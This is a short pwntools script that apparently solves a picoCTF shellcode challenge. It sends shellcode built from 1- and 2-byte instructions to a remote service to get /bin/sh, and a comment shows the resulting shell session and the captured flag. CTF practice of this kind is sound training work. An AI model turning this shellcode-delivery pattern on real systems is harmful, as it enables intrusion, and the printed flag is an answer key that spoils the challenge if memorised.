from pwn import *
import struct

p = remote('mercury.picoctf.net', 37853)
#p = process('./fun')

f = open('shellcode', 'rb')
sc = f.read()
f.close()

## Read until the prompt
p.readuntil(':\n')

input('..')
p.send(sc + b'\n')

p.interactive()

'''
The challenge inserts two nop instructions after every two bytes so I wrote shellcode with either 1 or 2 byte instructions
that executes /bin/sh.

[+] Opening connection to mercury.picoctf.net on port 37853: Done
..
[*] Switching to interactive mode
$ ls
flag.txt
fun
fun.c
xinet_startup.sh
$ cat flag.txt
picoCTF{th4t_w4s_fun_edd8e0b87b2038ea}
'''
